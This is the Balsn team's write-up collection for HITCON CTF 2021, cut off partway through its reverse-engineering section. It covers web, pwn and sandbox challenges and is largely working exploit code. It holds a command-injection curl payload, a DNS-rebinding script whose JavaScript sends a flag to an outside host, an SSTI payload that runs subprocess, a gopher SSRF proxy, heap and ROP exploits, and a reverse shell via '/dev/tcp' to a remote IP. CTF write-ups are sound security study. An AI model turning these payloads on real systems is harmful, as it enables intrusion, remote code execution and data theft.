---
title: "hitconctf2021 writeups"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "rsa", "free-hook", "canary", "ssrf", "ssti", "python-bytecode", "lsb", "wordpress", "dns-rebinding"]
summary: "It's recommended to read our responsive web version of this writeup."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20211203-hitconctf2021/README.md"
ctf:
  name: "hitconctf2021"
  year: 2021
---

## Source

- **CTF:** hitconctf2021 2021
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20211203-hitconctf2021/README.md>

---
# HITCON CTF 2021

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20211203-hitconctf2021/) of this writeup.**


 - [HITCON CTF 2021](#hitcon-ctf-2021)
   - [Web](#web)
     - [One-Bit Man](#one-bit-man)
     - [W3rmup PHP](#w3rmup-php)
     - [Vulpixelize](#vulpixelize)
       - [Solution 1: DNS rebinding](#solution-1-dns-rebinding)
       - [Solution 2: iFrame resize](#solution-2-iframe-resize)
     - [Metamon-Verse](#metamon-verse)
     - [FBI WARNING](#fbi-warning)
   - [Pwn](#pwn)
     - [dtcaas](#dtcaas)
     - [uml](#uml)
     - [metatalk](#metatalk)
     - [chaos [sandbox]](#chaos-sandbox)
   - [Reverse](#reverse)
     - [cclemon](#cclemon)
     - [baba is game](#baba-is-game)
     - [mercy](#mercy)
   - [Crypto](#crypto)
     - [a little easy rsa](#a-little-easy-rsa)
     - [still not rsa](#still-not-rsa)
     - [so easy rsa](#so-easy-rsa)
     - [magic rsa](#magic-rsa)
     - [magic dlog](#magic-dlog)
   - [Misc](#misc)
     - [baba is misc](#baba-is-misc)


## Web

### One-Bit Man

In this challenge, we can flip a single **bit** in a Wordpress blog server. The objective is to get RCE of the server.

Intuitively, wordpress provides admin servers at `/wp-admin`, but in the source code it's disabled. The password hash is changed to a dummy value, and it would be difficult to just flip one single bit to bypass the authentication.

```php
# files/init.sql
382:INSERT INTO `wp_users` VALUES (1,'admin','$P$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','admin','admin@example.com','{BASE}','2021-11-21 15:58:50','',0,'admin');
```

However, if we cannot flip the schema, how about flip the authentication logic in the source code?

```bash
$ rg 'wp_check_password'
user.php
174:    if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
```

We can simply negate the logic: luckily fliping one bit can make `!` (0x21) become ` ` (space, 0x20).

Therefore, we flip the specific one bit:

- `/var/www/html/wp-includes/user.php`
- 5389th byte
- flip 0 bit (LSB)

And any password will lead to successfully login.

Finally, install the [WPTerm](https://wordpress.org/plugins/wpterm/) plugin from the market to achieve RCE.

The flag is `hitcon{if your solution is l33t, please share it!}`.


### W3rmup PHP

Find a Norway proxy (I simply googled `norway proxy` and try each proxy to see if it works or not.), then

```bash=
curl -x http://146.59.199.43:80 'http://18.181.228.241/?mail=a|/readflag||@a.bc'
```

You can see [author's twitter](https://twitter.com/orange_8361/status/1467495104240062466) to get more details of this.

### Vulpixelize

#### Solution 1: DNS rebinding

Since the server does not check the `Host:` header, we can perform DNS rebinding on `0.0.0.0` and our server IP to exfitrate the flag.

You can read more about DNS rebinding in bookgin's blog: 
[Abusing DNS: Browser-based port scanning and DNS rebinding](https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/).

Create a dns server that provides multiple answers:
```python=
#!/usr/bin/env python3
from dnslib.server import DNSServer, DNSLogger, DNSRecord, RR
import time
import sys

class TestResolver:
  def resolve(self,request,handler):
    q_name = str(request.q.get_qname())
    print('[<-] ' + q_name)
    reply = request.reply()
    reply.add_answer(*RR.fromZone(q_name + " 0 A 1.3.3.7")) # my server's ip
    reply.add_answer(*RR.fromZone(q_name + " 0 A 0.0.0.0"))
    return reply

logger = DNSLogger(prefix=False)
resolver = TestResolver()
server = DNSServer(resolver,port=53,address="0.0.0.0",logger=logger)
server.start_thread()
try:
  while True:
    time.sleep(1)
    sys.stderr.flush()
    sys.stdout.flush()
except KeyboardInterrupt:
  pass
finally:
  server.stop()
```

Then create a simple http server, which will exit immediately after processing one GET request:
```python=
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        msg = b"""
<script>
fetch('/flag').then(x=>x.text()).then(x=>location=`http://ginoah.tw?b=${btoa(x)}`).catch(x=>location=`http://ginoah.tw?b=${btoa(x)}`);
</script>
"""
        self._set_headers()
        self.wfile.write(msg)
        exit(0)

def run(server_class=HTTPServer, handler_class=S, addr="localhost", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == "__main__":
    port = 38888 # challenge's port
    run(addr='0.0.0.0', port=port)

```

#### Solution 2: iFrame resize

```html
<iframe src="http://127.0.0.1:8000/flag" width="3000px" height="3000px" style="transform: scale(12);transform-origin:1050px 300px;">
```



### Metamon-Verse

Create a gopher proxy:
```python=
import socket
import time
import urllib.parse
import requests
import sys
from bs4 import BeautifulSoup

HOST = '0.0.0.0'
PORT = int(sys.argv[1])
URL = sys.argv[2]
KEY = sys.argv[3]
VALUE = int(sys.argv[4])

RHOST = '54.250.88.37'
RPORT = 39590
auth = ('ctf', 'e2a0ba1d0a4b40d4')

def serve_request(conn, key='TIMEOUT', value=2):
  # Lets just wait until we can assume all the data was sent
  time.sleep(.1)
  data = conn.recv(8192)
  payload = '_' + urllib.parse.quote(data)
  url = f"gopher://{URL}/{payload}xx"
  print('url:', url)
  key, value = KEY, VALUE

  res = requests.post(f"http://{RHOST}:{RPORT}/", data = {"url": url, f"CURLOPT_{key}": value}, auth=auth)
  soup = BeautifulSoup(res.text, 'html.parser')
  msg = soup.find(id='msg')
  if not msg.a:
    print('\033[91mError: ',msg.text.strip(), '\033[0m')
    return
  href = msg.a.get('href')
  print('\033[92mGET:', href, '\033[0m')
  res = requests.get(f"http://{RHOST}:{RPORT}/{href}", auth=auth)
  print('\033[92m',i, f'{len(res.content)}:',  res.content, '\033[0m')
  conn.send(res.content)
  return

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((HOST, PORT))
  s.listen()
  while True:
    conn, addr = s.accept()
    with conn:
      print('\033[92mConnected by', addr, '\033[0m')
      serve_request(conn)
      print('\033[93mDisconnected by', addr, '\033[0m')
```

Then mount nfs.server:/data to create a soft link
```bash=
$ python proxy.py 111 127.0.0.1:111 TIMEOUT 1
$ python proxy.py 2049 127.0.0.1:2049 LOCALPORT 888

$ sudo mount -t nfs 127.0.0.1:/data ./mnt -o nolock,vers=4 -v
$ sudo ln -s /app/templates/index.html mnt/c80de072846457372faf9609e6bfd79c.jpg
```

Finally overwrite index.html to SSTI
```python=
#!/usr/bin/env python3
import requests
from hashlib import md5
from urllib.parse import quote
import struct
s = requests.session()


host = 'http://54.250.88.37:39590/'
s.auth = ('ctf', 'e2a0ba1d0a4b40d4')


'''
{{  request['application']['__globals__']['__builtins__']['__import__'](https://raw.githubusercontent.com/balsn/ctf_writeup/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20211203-hitconctf2021/'subprocess').check_output('/readflag') }}
'''

url = "http://<YOUR_URL>/"
h = md5('1.3.3.7'.encode() + url.encode()).hexdigest()
path = f'/static/images/{h}.jpg'
print(path)
print(s.get(host + path).text)

r = s.post(host, data=dict(url=url))
print(r.text)
```

Notes:

1. The NFS server requires the src port of the TCP connection to [be less than 1024](https://www.spinics.net/lists/linux-nfs/msg32356.html). Otherwise it will give permission error. Fortunately we can use PyCurl's option `LOCALPORT` to do this.
2. Initially, we are trying to SSRF and replay the NFS packet, but the NFS protocol is so complicated (e.g. file handle), so we then work on how to estblish a proxy to perform NFS operations.
3. I'm not sure whether NFS V3 makes a difference here. We use `rpcinfo -p localhost` with the gopher proxy to determine if remote supports V3 or V4. It turns out both are supported.
4. Appending 2-byte garbage `xx`  in gopher is intentional. Otherwise the gopher will simply hang and not return.

### FBI WARNING

We find a very closed source code at [GitHub](https://github.com/hametsu/futaba). It seems like there are a lot of variation of this source code, but the core logic is the same.

Here is the source code of generating the unique id:

```php=
 $c_pass = $pwd;
  $pass = ($pwd) ? substr(md5($pwd),2,8) : "*";
  $youbi = array('日','月','火','水','木','金','土');
  $yd = $youbi[gmdate("w", $time+9*60*60)] ;
  $now = gmdate("y/m/d",$time+9*60*60)."(".(string)$yd.")".gmdate("H:i",$time+9*60*60);
  if(DISP_ID){
    if($email&&DISP_ID==1){
      $now .= " ID:???";
    }else{
      $now.=" ID:".substr(crypt(md5($_SERVER["REMOTE_ADDR"].IDSEED.gmdate("Ymd", $time+9*60*60)),'id'),-8);
    }
  }
```

With the hint that the IP starts with `219.`, we can brute-force the IP address.

```php=
<?php
for ($x = 0; $x <= 255; $x++) {
  for ($y = 0; $y <= 255; $y++) {
    for ($s = 0; $s <= 255; $s++) {
        $IP = '219.'.$s.".".$x.".".$y;
        if (substr(crypt(md5($IP.'idの種20211203'),'id'), -8) == 'ueyUrcwA'){
          echo 'boooom!!!!! '.$IP;
          die();
        }
      }
    }
  }
?>
```

The flag is `hitcon{219.91.64.47}`.

## Pwn

### dtcaas

```python=
from pwn import *
from IO_FILE import *

###Util
def upload(data):
    size = len(data)
    r.sendlineafter('Size?\n',str(size))
    r.sendafter('Data?\n',data)

###Addr
free_hook_offset = 0x1eeb28
system_offset = 0x55410

###Exploit
r = remote('52.196.81.112',3154)

leak = '''
/dts-v1/;
/ {
    exp {
        leak = /incbin/("/proc/self/maps");    
    };

};
'''
upload(leak)
while True:
    res = r.recvline()
    if b'libc' in res:
        break
libc_base = int(res.split(b'-')[0],16)
print(hex(libc_base))

shell = '''
/dts-v1/;
/ {
    exp {
        setup = "123456789abcdef0123456789abcdef0123456789abcdef0";
        pwn = /incbin/("/proc/self/fd/0",0,4294967344);
    };
};
'''
upload(shell)

padding = b'a'*0x1b0
IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags=0xfbad2088,
                           buf_base=libc_base+free_hook_offset-0x10, buf_end=libc_base+free_hook_offset-0x10+0x100000000)
payload = padding+stream[:0x48]
r.send(payload)
sleep(1)
payload = p64(libc_base+free_hook_offset-0x8)+b'/bin/sh\x00'+p64(libc_base+system_offset)
r.send(payload)

r.interactive()
```

### uml

```python
from pwn import *
context.arch = "amd64"

r = remote("3.115.128.152", 3154)
def Read(size):
    r.sendlineafter("Choose one:","2")
    r.sendlineafter("Size?",str(size))
    r.recvline()
    r.recvline()
    return r.recvn(size)

def Write(data):
    r.sendlineafter("Choose one:","1")
    r.sendlineafter("Size?",str(len(data)))
    r.recvline()
    r.recvline()
    r.sendline(data)
r.sendlineafter("Name of note?","/../../../dev/mem")


for i in range(0x360):
    Read(0x1000)
    print(hex(i))

for i in range(0xd):
    Read(0x1000)
    print(hex(i))

Read(0x900+8*10)

sc = b"/home/uml/flag-6db0fa76a6b0".ljust(0x30,b"\x00")
sc += asm(f"""
mov rdi,0x6036D958
mov rsi,0x0
mov rax,2
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x100
mov rax,0
syscall
mov rax,1
mov rdi,1
mov rsi,rsp
mov rdx,0x100
syscall
l:
 jmp l
""")

payload = p64(0x6036D900+8*11+0x30)
payload += sc
Write(payload)
r.interactive()

```


### metatalk

```python
from pwn import *
import struct

HOST = "18.181.73.12"
PORT = 4869
#context.log_level = "error"

def create_header(data):
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x04" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += struct.pack(">I", len(data)) # data offset
    dsi_header += struct.pack(">I", len(data))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += data
    return dsi_header

def create_nop(data):
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x08" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += struct.pack(">I", len(data)) # data offset
    dsi_header += struct.pack(">I", len(data))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += data
    return dsi_header


def create_cmd(data):
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x08" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += struct.pack(">I", len(data)) # data offset
    dsi_header += struct.pack(">I", len(data))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += data
    return dsi_header


def leak(prefix):
    context.log_level = "error"
    global table,data
    for i in range(0,0x100):
        #print(i)
        r = remote("18.181.73.12",4869)
        r.recvline()
        s = process(r.recvline()[:-1].split())
        s.recvuntil(b"token: ")
        ans = s.recvline()[:-1]
        s.close()
        r.sendline(ans)
        r.send(create_header(b""))
        r.recvn(0x10)
        payload = b"\x00"*0x102270
        payload += prefix
        payload += p8(i)
        r.send(create_nop(payload))
        try:
            r.recvn(13,timeout=1)
            r.close()
            data+=p8(i)
            break
        except:
            r.close()  


rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

  
"""
for i in range(8):
    data += leak(data)
    
data += b"a"*0x20

for i in range(8):
    data += leak(data)
"""    

data = b'\x80\x02\x83\xb4\xea\x7f\x00\x00'+b"a"*0x20 + b"\x00\x81\xdb\x1f\x74\x32\x7f\x7b"


canary_data = data[0x28:0x30]
data = data[:0x8]


fsbase = u64(data)
canary = u64(canary_data)
setcontext = fsbase - 0xc610cb
buf = fsbase-0x102270
libc = fsbase - 0xcb3280
"""
0x00000000000215bf: pop rdi; ret;
0x0000000000130569: pop rdx; pop rsi; ret;
0x0000000000043ae8: pop rax; ret;
0x00000000000d2745: syscall; ret;
"""


context.log_level = 20
r = remote(HOST,PORT)
r.recvline()
s = process(r.recvline()[:-1].split())
s.recvuntil(b"token: ")
ans = s.recvline()[:-1]
s.close()
r.sendline(ans)

r.send(create_header(b""))
r.recvn(0x10)
context.arch = "amd64"

cmd = b'bash -c "bash > /dev/tcp/3.112.16.91/4444 0>&1"'
payload = b"/bin/sh\x00" + b"-c"+b"\x00"*6
payload += cmd.ljust(0x70,b"\x00")
payload += p64(buf)+p64(buf+8)+p64(buf+0x10)+p64(0)
payload = payload.ljust(0x100,b"\x00")

payload += flat(
buf+0x110,libc+0x0000000000043ae8,0x3b,
libc+0x00000000000215bf,buf,
libc+0x0000000000130569,0,buf+0x80,
libc+0x00000000000d2745

)
payload = payload.ljust(0x102270-88,b"\x00")
payload += p64(fsbase+0x38)
payload = payload.ljust(0x102270,b"\x00")
payload += p64(fsbase)*5+p64(canary)
payload += b"\x00"*8
payload += p64(rol(setcontext,0x11,64)) + p64(buf-0xa0+0x100)
r.send(create_cmd(payload))

r.close()

```


### chaos [sandbox]

main.c
```cpp
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <errno.h>


int dev;
char *buf;
size_t fdaddr = 0;
struct __attribute__((__packed__)) Req {
    uint32_t op;
    uint32_t inp;
    uint32_t in_size;
    uint32_t key;
    uint32_t key_size;
    uint32_t out;
    uint32_t out_size;
};

#define CHAOS_ALLOCATE_BUFFER 1074317824
#define CHAOS_REQUEST 3223112192

#define check(x, msg) {if (!(x)) { puts(msg); return -1; }}

void dbg() { puts("> continue"); char c; read(0, &c, 1); }



int read_flag() {
    int ret;
    struct Req req = {
        .op = 6,
        .out = 0,
        .out_size = 128,

    };
    ret = ioctl(dev, CHAOS_REQUEST, &req);
    //check(ret == 0, "req failed");
    //ret = req.out_size;
    puts(buf);

    return ret;
}


int create_key(int size) {
    int ret;
    struct Req req = {
        .op = 1,
        .key = 0,
        .key_size = size,
    };
    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;

    return ret;
}

int free_key(int key_entry) {
    int ret;
    struct Req req = {
        .op = 0,
        .key_size = key_entry,
    };
    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;

    return ret;
}

int encrypt_buf(int key_entry, int size) {
    int ret;
    struct Req req = {
        .op = 2,
        .inp = 0,
        .in_size = size, // overflow if in_size < 32 and (in_size & 7) == 0
        .out = 0,
        .out_size = 128,
        .key_size = key_entry, // misuse this field for argument
    };

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;


}

int decrypt_buf(int key_entry, int size) {
    int ret;
    struct Req req = {
        .op = 3,
        .inp = 0,
        .in_size = size, // overflow if in_size < 32 and (in_size & 7) == 0
        .out = 0,
        .out_size = 128,
        .key_size = key_entry, // misuse this field for argument
    };

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;


}

int aes_enc(char* data, int key_entry, int size) {
    int ret;
    struct Req req = {
        .op = 4,
        .inp = 0,
        .in_size = size, // overflow if in_size < 32 and (in_size & 7) == 0
        .out = 0,
        .out_size = 256,
        .key_size = key_entry, // misuse this field for argument
    };

    for ( int i = 0; req.in_size > i; ++i )
        buf[i + req.inp] = data[i];

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;
    printf("ret = %llu, %016llx\n", ret, ret);


    for (int i=0; i<32; i++) {
        printf("%02x", (unsigned char) buf[i + req.out]);
        data[i] = buf[i + req.out];
    }
    puts("");
}

void print_regs() {
    int ret;
    struct Req req = {
        .op = 5,
        .out = 0,
        .out_size = 256,
        .inp = 0,
        .in_size = 256,
        .key = 0,
        .key_size = 256,
    };

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;
    printf("ret = %llu, %016llx\n", ret, ret);

    uint64_t* u64buf = (uint64_t*) &buf[req.out];
    const char* rn[] = {"rax", "rbx", "rcx", "rdx", "rdi", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15", "rsp"};
    for (int i=0; i<15; i++) {
        printf("%3s: %016llx\n", rn[i], u64buf[i]);
    }
    fdaddr = u64buf[1] + 0x5090;
    puts("");
}
uint32_t pad[0x10];
char secret[0x20];
uint32_t keys[0x100];
int main() {
    int ret;
    dev = open("/dev/chaos", 2);
    check(dev >= 0, "GG1");

    ret = ioctl(dev, CHAOS_ALLOCATE_BUFFER, 0x2000);
    check(ret == 0, "GG2");

    buf = mmap(0LL, 0x2000, 2LL, 1LL, dev, 0LL);
    check(buf != MAP_FAILED, "GG3");
    puts("run\n");
    print_regs();
    
   
    for(int i=0;i<0x10;i++)
	    pad[i] = create_key(0x10);

    uint32_t key_entry = 0;
    size_t* ptr = buf;
    uint32_t base = create_key(0x20);
    ptr[3] = 0x1101; // overwrite unsortebin size
    encrypt_buf(base,0x20);
    memcpy(secret,buf,0x20);
    ptr[0xff8/8] = ptr[3];  //put remain data

    //memset(buf,'A',0x1000);
    //
    ptr[(0x100-0x20+0x8)/8] = 0x20;
    ptr[(0x100-0x20+0x8)/8-1] = 0x1100;

    free_key(create_key(0x30));
    keys[0] = create_key(0x1000);
    uint32_t target = create_key(0x100);
    keys[1] = create_key(0x1000);
    

    free_key(keys[0]);
    keys[0] = create_key(0x2000);
    free_key(keys[1]);
    keys[1] = create_key(0x1000-0x30);
    memcpy(buf,secret,0x20);
    
    decrypt_buf(base,0x18); //overflow 
    
    free_key(create_key(0x100));
    free_key(target); 
    create_key(0xe00);
    ptr[0xb0/8] = fdaddr;
    printf("%p\n",fdaddr);
    create_key(0x190);
     
    ptr[0] = 0;
    free_key(pad[0]);
    free_key(pad[1]);
    free_key(pad[2]);
    free_key(pad[3]);
    create_key(0x100); 
    memset(ptr,0x100,0);
    ptr[0] = 1;
    ptr[1] = 0;
    ptr[2] = 0x0000000000201000;
    ptr[3] = 0x0000000000002000;
    ptr[4] = 0x0000000000100000;
    ptr[5] = 0x0000000000100000;
    ptr[6] = 0x0000000010000000;
    ptr[7] = 0x0000000000100000;
    ptr[8] = 0x0000000000010000;
    ptr[9] = 0x0000000000000080;
/*
0x55555555f170: 0x0000000000000000      0x0000000000000000
0x55555555f180: 0x0000000000201000      0x0000000000002000
0x55555555f190: 0x0000000000100000      0x0000000000100000
0x55555555f1a0: 0x0000000010000000      0x0000000000100000
0x55555555f1b0: 0x0000000000010000      0x0000000000000080
0x55555555f1c0: 0x0000000000000000      0x0000000000000000
0x55555555f1d0: 0x0000000000000000      0x0000000000000000
0x55555555f1e0: 0x0000000000000000      0x0000000000000000
0x55555555f1f0: 0x0000000000000000      0x0000000000000000
0x55555555f200: 0x0000000000000000      0x0000000000000000
0x55555555f210: 0x0000000000000000      0x0000000000000000
0x55555555f220: 0x0000000000000000      0x0000000000000000
0x55555555f230: 0x0000000000000000      0x0000000000000000
0x55555555f240: 0x0000000000000000      0x0000000000000000
0x55555555f250: 0x0000000000000000      0x0000000000000000
0x55555555f260: 0x0000000000000000      0x0000000000000000
*/

    create_key(0x100); 
    /*
    */
    //read(0,&ret,4);
    read_flag();
    return 0;
}


```

firmware.s
```
.intel_syntax noprefix
.section .text
.globl _start
_start:
    push rsp
    push r15
    push r14
    push r13
    push r12
    push r11
    push r10
    push r9
    push r8
    push rsi
    push rdi
    push rdx
    push rcx
    push rbx
    push rax
    mov r11, rsp

    mov     rdx, ds:0x10048
    cmp     rdx, ds:0x10050

    mov     rax, ds:0x10020
    mov     rcx, ds:0x10010
    lea     ebx, [rcx+0x10000000]
    lea     rcx, [rax-1]
    add     rax, rax
    and     rcx, rdx
    dec     rax
    inc     rdx
    imul    rcx, 0x0D
    and     rax, rdx
    mov     ds:0x10048, rax
    add     rbx, rcx

    mov     eax, [rbx+5] # req
    lea     rbp, [rax+0x10000000] # req

    mov     r12d, [rbp+0x00] # op

    mov     esi, [rbp+0x04] # inp
    mov     edx, [rbp+0x08] # inpSZ
    lea     r13, [esi+0x10000000]

    mov     esi, [rbp+0x0C] # key
    mov     edx, [rbp+0x10] # keySZ
    lea     r14, [esi+0x10000000]

    mov     esi, [rbp+0x14] # out
    mov     edx, [rbp+0x18] # outSZ
    lea     r15, [esi+0x10000000]


dispatch:
    cmp r12d, 0
    je handler_0
    cmp r12d, 1
    je handler_1
    cmp r12d, 2
    je handler_2
    cmp r12d, 3
    je handler_3
    cmp r12d, 4
    je handler_4
    cmp r12d, 5
    je handler_5
    cmp r12d, 6
    je handler_6
    jnz default


handler_0:
    # syscall(0x0C8A05, 255, key_entry)
    # op
    mov     esi, 255

    # key_entry
    mov     rdx, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done

handler_1:
    # syscall(0x0C8A05, 254, key)
    # op
    mov     esi, 254

    # key
    mov     eax, [rbp + 0x10]
    mov     rdx, r14
    shl     rdx, 0x20
    or      rdx, rax

    mov     edi, 0x0C8A05
    call    syscall
    jmp done


handler_2:
    # syscall(0x0C8A05, 11, inp, out, key_entry)
    # op
    mov     esi, 11

    # inp
    mov     eax, [rbp + 0x08]
    mov     rdx, r13
    shl     rdx, 0x20
    or      rdx, rax

    # out
    mov     eax, [rbp + 0x18]
    mov     rcx, r15
    shl     rcx, 0x20
    or      rcx, rax

    # key_entry
    mov     r8, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done


handler_3:
    # syscall(0x0C8A05, 12, inp, out, key_entry)
    # op
    mov     esi, 12

    # inp
    mov     eax, [rbp + 0x08]
    mov     rdx, r13
    shl     rdx, 0x20
    or      rdx, rax

    # out
    mov     eax, [rbp + 0x18]
    mov     rcx, r15
    shl     rcx, 0x20
    or      rcx, rax

    # key_entry
    mov     r8, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done


handler_4:
    # syscall(0x0C8A05, 12, inp, out, key_entry)
    # op
    mov     esi, 3

    # inp
    mov     eax, [rbp + 0x08]
    mov     rdx, r13
    shl     rdx, 0x20
    or      rdx, rax

    # out
    mov     eax, [rbp + 0x18]
    mov     rcx, r15
    shl     rcx, 0x20
    or      rcx, rax

    # key_entry
    mov     r8, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done


handler_5:
    mov     ecx, 120
    mov     rdi, r15
    mov     rsi, r11
    rep     movsb
    mov     rax, 42
    jmp done



handler_6:
    mov rdi,821756
    mov rsi,r15
    xor eax,eax
    call syscall
    mov rax,42 
    jmp done
    


default:
    mov rax, 42
    jmp done

done:
    mov     rdx, ds:0x10028
    mov     rcx, ds:0x10018
    mov     rsi, ds:0x10060
    lea     edi, [rcx+0x10000000]
    lea     rcx, [rdx-1]
    add     rdx, rdx
    and     rcx, rsi
    dec     rdx
    inc     rsi
    imul    rcx, 6
    and     rdx, rsi
    add     rcx, rdi
    mov     di, [rbx]
    mov     [rcx+2], eax
    mov     [rcx], di
    mov     ds:0x10060, rdx

exit:
    mov     esi, 0          
    mov     edi, 60
    xor     r9d, r9d
    xor     r8d, r8d
    xor     ecx, ecx
    xor     edx, edx
    xor     eax, eax
    call    syscall


syscall:
    mov     rax, rdi
    mov     rdi, rsi
    mov     rsi, rdx
    mov     rdx, rcx
    mov     r10, r8
    mov     r8, r9
    syscall
    ret

```

## Reverse

### cclemon

```c=
#include<stdio.h>
#include<stdlib.h>

unsigned int state = 0x4183139;
unsigned int *a;


unsigned int w(){
  state = state*0x133791+0x132b9d01;
  return state;
}

void s(unsigned int x,unsigned int y){
  unsigned int tmp;
  tmp = a[x];
  a[x] = a[y];
  a[y] = tmp;
  return;
}

void r(unsigned int x,unsigned int y){
  if(x>y){
    r(y,x);
    return;
  }
  while(x<y){
    s(x,y);
    x+=1;
    y-=1;
  }
  return;
}

void o(unsigned int x,unsigned int y,unsigned int val){
  if(x>y){
    o(y,x,val);
    return;
  }
  for(int i=x;i<=y;i++)
    a[i]^=val;
  return;
}

int main(){
  unsigned int A,B,C,D;
  a = malloc(200000*sizeof(unsigned int));
  if(a==NULL){puts("malloc failed"); exit(0);}
  for(int i=0;i<200000;i++)
    a[i] = w();
  for(int i=0;i<1000000;i++){
    if(i%10000==0) fprintf(stderr,"%d\n",i);
    A = w()%3;
    B = w()%200000;
    C = w()%200000;
    switch(A){
      case 0:
        r(B,C);
    break;
      case 1:
    s(B,C);
    break;
      case 2:
    D = w();
    o(B,C,D);
    break;
      default:
    puts("error");
    exit(0);
    }
  }
  unsigned long long int res;
  printf("n = [");
  for(int i=0;i<200000;i++){
    res = (unsigned long long int)a[i];
    res*=(unsigned int)(i+1);
    printf("%llu,",res);
  }
  puts("]\nprint(sum(n))");
  return 0;
}
    
```

### baba is game
This challenge is basically a slightly modified version of the game [Baba is you](https://en.wikipedia.org/wiki/Baba_Is_You).

BabaCLI takes map file as argument, outputs several rules. After checking it with IDA, we found out that the program takes 7 kinds of inputs: w, a, s, d, x, r, l (and ends otherwise). The BabaCLI basically do the following operations after every input:

```
switch(input) {
    case 'w':
        travels up if not blocked;
        check if any event happens;
        break;
    case 'a':
        travels left if not blocked;
        check if any event happens;
        break;
    case 's':
        travels down if not blocked;
        check if any event happens;
        break;
    case 'd':
        travels right if not blocked;
        check if any event happens;
        break;
    case 'x':
        undo last step;
        break;
    case 'r':
        print current rules;
        break;
    case 'l':
        break;
```

---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20211203-hitconctf2021/README.md>*
